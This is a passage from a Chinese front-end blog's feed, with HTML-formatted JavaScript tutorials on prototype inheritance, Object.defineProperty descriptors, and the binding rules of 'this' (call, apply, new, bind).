class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">  &#125;,</div><div class="line">  getAge: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//这里会出现一个问题， constructor不指向Person</span></div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</div><div class="line"><span class="built_in">console</span>.log(person1.constructor); <span class="comment">// Object</span></div></pre></td></tr></table></figure>
<p>解决方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Object</span>.defineProperty(Person.prototype, <span class="string">"constructor"</span>, &#123;</div><div class="line">  enumerable: <span class="literal">false</span>,</div><div class="line">  value: Person</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="comment">// ES6方法</span></div><div class="line"><span class="built_in">Object</span>.assign(Person.prototype, &#123;</div><div class="line">  getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">  &#125;,</div><div class="line">  getAge: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</div><div class="line">  &#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>ECMAScript只支持实现继承，主要依靠原型链来完成</p>
<p>A需要继承B，既然A.prototype与B.prototype相连接</p>
<p>A.prototype = B.prototype 是完全错误，js是引用复制，后续扩展B.prototype对A产生影响</p>
<p>A.prototype = new B() 如果函数B有一些副作用，就会产生一些影响</p>
<p>｀A.prototype = Object.create(B.prototype)｀ or ES6中，也可使用｀Object.setPrototypeOf(A.prototype, B.prototype)｀</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.name = name;</div><div class="line">  <span class="keyword">this</span>.age = age;</div><div class="line">  <span class="keyword">this</span>.test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'test'</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">score</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.score = score;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Student.prototype = <span class="built_in">Object</span>.create(Person.prototype);</div><div class="line"><span class="comment">/* Object&#123;&#125; 只有getName</span></div><div class="line"> * 凭Person.prototype创建一个“新”对象并把它关联到Foo.prototype中</div><div class="line"> */</div><div class="line"><span class="built_in">console</span>.log(Student.prototype);</div><div class="line"></div><div class="line">Student.prototype = <span class="keyword">new</span> Person();</div><div class="line"><span class="comment">/* Person &#123;name: undefined, age: undefined&#125;</span></div><div class="line"> * 这样Student上就会有name、age和test</div><div class="line"> */</div><div class="line"><span class="built_in">console</span>.log(Student.prototype);</div><div class="line"></div><div class="line">Student.prototype.getScore = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.score);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> stu = <span class="keyword">new</span> Student(<span class="string">'90'</span>);</div><div class="line">stu.getScore(); <span class="comment">// 90</span></div><div class="line"><span class="comment">// TypeError，如果是new Person() 则会输出'test'</span></div><div class="line">stu.test();</div></pre></td></tr></table></figure>
<p>如果Person函数中有赋值的变量，使用new Person()给Student的原型后就会发生共享，我们还需要借用构造函数来实现对实例对象的继承，即(寄生)组合继承模式，原型属性和方法通过原型链来继承，实例属性通过构造方法来继承:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.name = name;</div><div class="line">  <span class="keyword">this</span>.age = age;</div><div class="line">  <span class="keyword">this</span>.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">score, name, age</span>) </span>&#123;</div><div class="line">  <span class="comment">// 继承属性, 其实相当于 this.name = name, this.age = age定义在这里，但getAge也会被call</span></div><div class="line">  Person.call(<span class="keyword">this</span>, name, age); </div><div class="line">  <span class="keyword">this</span>.score = score;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * Student.prototype = new Person();</div><div class="line"> * 这里如果使用new的话，相当于调用了两次Person()，同时会使Student原型与实例都带有name，age属性，没有必要</div><div class="line"> */</div><div class="line">Student.prototype = <span class="built_in">Object</span>.create(Person.prototype);</div><div class="line">Student.prototype.constructor = Student</div><div class="line"></div><div class="line">Student.prototype.getScore = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.score);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> stu = <span class="keyword">new</span> Student(<span class="number">59</span>, <span class="string">'Tom'</span>, <span class="number">23</span>);</div><div class="line">stu.getName(); <span class="comment">// Tom</span></div><div class="line">stu.getScore(); <span class="comment">// 59</span></div><div class="line">stu.getAge(); <span class="comment">// 23</span></div></pre></td></tr></table></figure>
<p>总之原型链是这样的: 实例本身属性与方法(在构造函数中或自己定义赋值) -&gt; 父类的原型属性与方法 -&gt; 父类的父类的原型属性与方法 -&gt; … -&gt; object.prototype -&gt; null。</p>
<p>除了本身的属性与方法外，其它都是要与其它实例共享的，如果改变原型链上的方法会影响其它实例，如果定义了与原型链一样的属性或方法，原型链上的方法将会被屏蔽。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;对象的定义&quot;&gt;&lt;a href=&quot;#对象的定义&quot; class=&quot;headerlink&quot; title=&quot;对象的定义&quot;&gt;&lt;/a&gt;对象的定义&lt;/h2&gt;&lt;p&gt;无序属性的集合，其属性可以包含基本值、对象或函数。可以将对象想象成散列表，即一组名值对，值可以是数据或是函数&lt;/p&gt;
&lt;h2 id=&quot;属性设置&quot;&gt;&lt;a href=&quot;#属性设置&quot; class=&quot;headerlink&quot; title=&quot;属性设置&quot;&gt;&lt;/a&gt;属性设置&lt;/h2&gt;&lt;p&gt;采用Object.defineProperty() 方法直接在一个对象上定义一个新属性，或者修改一个已经存在的属性，并返回这个对象。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Object.defineProperty(obj, prop, descriptor)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;obj 需要定义属性的对象。&lt;/li&gt;
&lt;li&gt;prop 需被定义或修改的属性名。&lt;/li&gt;
&lt;li&gt;descriptor 需被定义或修改的属性的描述符。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;属性主要分为两种: 数据属性和访问器属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;configurable: &lt;/strong&gt;当且仅当该属性的configurable为true时，该属性才能够被改变，也能够被删除，默认为false。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;enumerable: &lt;/strong&gt;当且仅当该属性的enumerable为true时，该属性才能够出现在对象的枚举属性中，默认为false。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;value: &lt;/strong&gt;该属性对应的值。可以是任何有效的JavaScript值（数值，对象，函数等），默认为undefined。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;writable: &lt;/strong&gt;当且仅当该属性的writable为true时，该属性才能被赋值运算符改变，默认为false。&lt;/p&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="JavaScript基础" scheme="http://blackganglion.com/tags/JavaScript%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>this到底指向啥</title>
    <link href="http://blackganglion.com/2016/03/03/this%E5%88%B0%E5%BA%95%E6%8C%87%E5%90%91%E5%95%A5/"/>
    <id>http://blackganglion.com/2016/03/03/this到底指向啥/</id>
    <published>2016-03-03T09:31:00.000Z</published>
    <updated>2016-07-08T15:08:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>this总是让人感到有些费解，在阅读一些代码时时不时就冒出来让人丈二和尚摸不着头脑。由于受到一些其他语言的影响，比如Java类中的this是引用自身的指针，曾让我一度认为一切皆对象的JavaScript中函数的this也指向函数本身，这是完全错误的！一个很简单的测试：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 输出 window 对象, 'use strict'模式下是undefined</span></div><div class="line">  <span class="keyword">this</span>.x = <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">test();</div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.x); <span class="comment">// 2, 'use strict'模式下TypeError</span></div></pre></td></tr></table></figure>
<p>我们可以很明显地看到this指向的是全局window对象，而不是函数自己。实际上，this是在运行时进行绑定的，并不是在编写时绑定的，它的上下文取决于函数调用时的各种条件。this的绑定与函数声明的位置没有任何关系，只取决于函数的调用方式。</p>
<a id="more"></a>
<p>那这里就来梳理一下一个函数调用时，究竟发生了什么。一个函数被执行时，会创建一个执行环境 <code>ExecutionContext</code> ，函数的所有的行为均发生在此执行环境中，构建该执行环境时，JavaScript首先会创建 <code>arguments</code> 变量，其中包含调用函数时传入的参数。接下来创建作用域链。然后初始化变量，首先初始化函数的形参表，值为 <code>arguments</code> 变量中对应的值，如果 arguments变量中没有对应值，则该形参初始化为 undefined。如果该函数中含有内部函数，则初始化这些内部函数。如果没有，继续初始化该函数内定义的局部变量，需要注意的是此时这些变量初始化为 undefined，赋值操作需要在函数执行时才进行，这就是所谓的JavaScript的变量提升，我们总是说尽量不要直接定义 <code>function</code> ，会造成全局的变量污染，也是这个道理。最后为this变量赋值，会根据函数调用方式的不同，赋给this全局对象，当前对象等。至此函数的执行环境 <code>ExecutionContext</code> 创建成功，函数开始逐行执行，所需变量均从之前构建好的执行环境 <code>ExecutionContext</code> 中读取。下面例子包含了大多数情况：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">c</span>) </span>&#123;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> d = <span class="number">1</span>;</div><div class="line"></div><div class="line">  <span class="built_in">console</span>.log(a); <span class="comment">// function a</span></div><div class="line">  <span class="built_in">console</span>.log(b); <span class="comment">// undefined</span></div><div class="line">  <span class="built_in">console</span>.log(test2); <span class="comment">// function test2</span></div><div class="line">  <span class="built_in">console</span>.log(c); <span class="comment">// function c</span></div><div class="line">  <span class="built_in">console</span>.log(d); <span class="comment">// 1</span></div><div class="line"></div><div class="line">  <span class="keyword">var</span> a, b = <span class="number">1</span>;</div><div class="line"></div><div class="line">  <span class="built_in">console</span>.log(b); <span class="comment">// 1</span></div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</div><div class="line"></div><div class="line">  b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</div><div class="line"></div><div class="line">  <span class="built_in">console</span>.log(b); <span class="comment">// function b</span></div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">test2</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">test(<span class="number">3</span>);</div></pre></td></tr></table></figure>
<p>下面总结一下this的几种情况：</p>
<h2 id="默认情况"><a href="#默认情况" class="headerlink" title="默认情况"></a>默认情况</h2><p>默认的this与本文开头一致，为全局window对象，严格模式下为undefined，让我们再看一个例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 依然为window对象</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> test3 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.a = <span class="number">1</span>;</div><div class="line">  <span class="keyword">this</span>.b = <span class="number">2</span>;</div><div class="line">  test2();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> test2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.a = <span class="number">2</span>;</div><div class="line">  <span class="keyword">this</span>.b = <span class="number">3</span>;</div><div class="line">  test();</div><div class="line">&#125;</div><div class="line"></div><div class="line">test3();</div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a); <span class="comment">// 2</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.b); <span class="comment">// 3</span></div></pre></td></tr></table></figure>
<h2 id="作为对象方法调用"><a href="#作为对象方法调用" class="headerlink" title="作为对象方法调用"></a>作为对象方法调用</h2><p>在上下对象中调用，this绑定上下文对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">doFoo</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line">  fn(); <span class="comment">// 实际也是一种引用</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">doFoo2</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line">  fn.call(obj);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> obj = &#123;</div><div class="line">  a: <span class="number">2</span>,</div><div class="line">  foo: foo</div><div class="line">&#125;</div><div class="line"></div><div class="line">obj.foo(); <span class="comment">// 输出 Object &#123;a: 2&#125;</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> test = obj.foo; <span class="comment">// 直接引用</span></div><div class="line"></div><div class="line">test(); <span class="comment">// 又输出window！</span></div><div class="line"></div><div class="line">doFoo( obj.foo ); <span class="comment">// 回调函数</span></div><div class="line"></div><div class="line">doFoo2( obj.foo ); <span class="comment">// 输出 Object &#123;a: 2&#125;</span></div></pre></td></tr></table></figure>
<h2 id="apply、call与this"><a href="#apply、call与this" class="headerlink" title="apply、call与this"></a>apply、call与this</h2><p>我们可以用 <strong>Function.prototype.apply</strong> 与 <strong>Function.prototype.call</strong></p>
<p>apply与call的作用是完全一样的，这是参数略有不同，fun.call(this, arg1, arg2, …)，fun.apply(this, [arg1, arg2, …])</p>
<p>这里的this就是apply与call的第一个参数所指定的对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="comment">// 我利用apply方法，将一个空对象传入，&#123;&#125;即为函数的this</span></div><div class="line">  <span class="keyword">this</span>.a = <span class="number">1</span>;</div><div class="line">  <span class="keyword">this</span>.b = <span class="number">2</span>;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(test.apply(&#123;&#125;));</div><div class="line"><span class="comment">// Object &#123;a: 1, b: 2&#125;</span></div></pre></td></tr></table></figure>
<p>这样就可以很方便地进行运用一些对象本身所不具有的方法了，举个例子，对一个空对象添加一些数据并对其排序：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> test = &#123;&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">'toString'</span> <span class="keyword">in</span> test); <span class="comment">// true</span></div><div class="line"><span class="built_in">console</span>.log(<span class="string">'push'</span> <span class="keyword">in</span> test); <span class="comment">// false</span></div><div class="line"><span class="built_in">console</span>.log(<span class="string">'sort'</span> <span class="keyword">in</span> test); <span class="comment">// false</span></div><div class="line"></div><div class="line"><span class="built_in">Array</span>.prototype.push.apply(test, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">98</span>, <span class="number">3</span>, <span class="number">98</span>, <span class="number">23</span>, <span class="number">56</span>, <span class="number">12</span>, <span class="number">12</span>]);</div><div class="line"><span class="comment">// Object &#123;0: 1, 1: 2, 2: 98, 3: 3, 4: 98, 5: 23, 6: 56, 7: 12, 8: 12, length: 9&#125;</span></div><div class="line"><span class="built_in">console</span>.log(test);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params">value1, value2</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span>(value1 &lt; value2) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(value1 &gt; value2) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">sort是toString后进行字符串比对排序的，所以默认不按大小排序</div><div class="line">Array.prototype.sort.call(test, compare);</div><div class="line">*/</div><div class="line"><span class="keyword">var</span> ans = [].slice.call(test).sort(compare);</div><div class="line"><span class="built_in">console</span>.log(ans);</div><div class="line"><span class="comment">// [98, 98, 56, 23, 12, 12, 3, 2, 1]</span></div></pre></td></tr></table></figure>
<h2 id="new与this"><a href="#new与this" class="headerlink" title="new与this"></a>new与this</h2><p>JavaScript中的”构造函数”与其他语言完全不同。new只是作为语法糖，实际是在new时调用了构造函数。</p>
<p>new来调用函数时，会自动执行下列操作：</p>
<ul>
<li>创建一个全新的对象</li>
<li>新对象执行原型的链接</li>
<li>新对象绑定到函数调用的this</li>
<li>自动返回这个新对象</li>
</ul>
<p>这里的this指的就是新创建的对象</p>
<p>看一下下面的例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.a = a;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">  <span class="comment">// test &#123;a: 2&#125;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">test.prototype.add = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.a++;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">    <span class="comment">// test &#123;a: 3&#125;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> test(<span class="number">2</span>);</div><div class="line">bar.add();</div></pre></td></tr></table></figure>
<h2 id="关于bind"><a href="#关于bind" class="headerlink" title="关于bind"></a>关于bind</h2><p>在ES5中引入了<code>Function.prototype.bind</code>方法，将bind方法的第一个参数作为当前函数的执行上下文：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!(<span class="string">'bind'</span> <span class="keyword">in</span> <span class="built_in">Function</span>.prototype))&#123;</div><div class="line">    <span class="built_in">Function</span>.prototype.bind = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="comment">// 这里是对象方法的调用，this就是调用者，比如下面的例子中就是this.onClick</span></div><div class="line">        <span class="keyword">var</span> fn = <span class="keyword">this</span>, </div><div class="line">            <span class="comment">// bind的第一个参数</span></div><div class="line">            context = <span class="built_in">arguments</span>[<span class="number">0</span>], </div><div class="line">            <span class="comment">// arguments只是类数组对象，利用slice提取顺便转换</span></div><div class="line">            args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);</div><div class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="comment">// 利用apply，改变函数执行上下文</span></div><div class="line">            <span class="keyword">return</span> fn.apply(context, args.concat(<span class="built_in">arguments</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="情况1"><a href="#情况1" class="headerlink" title="情况1:"></a>情况1:</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyClass</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">this</span>.element = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>];</div><div class="line">    <span class="keyword">this</span>.element.addEventListener(<span class="string">'click'</span>, <span class="keyword">this</span>.onClick.bind(<span class="keyword">this</span>), <span class="literal">false</span>); <span class="comment">// this.onClick 绑定了this</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">MyClass.prototype.onClick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 输出 MyClass</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> MyClass();</div></pre></td></tr></table></figure>
<h3 id="情况2"><a href="#情况2" class="headerlink" title="情况2:"></a>情况2:</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyClass</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">this</span>.element = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>];</div><div class="line">    <span class="keyword">this</span>.element.addEventListener(<span class="string">'click'</span>, <span class="keyword">this</span>.onClick, <span class="literal">false</span>); <span class="comment">// this.onClick 没有绑定了this</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">MyClass.prototype.onClick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 输出 this.element</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> MyClass();</div></pre></td></tr></table></figure>
<p>这也让我明白了，利用ES6的React为何要在constructor中进行手工绑定:</p>
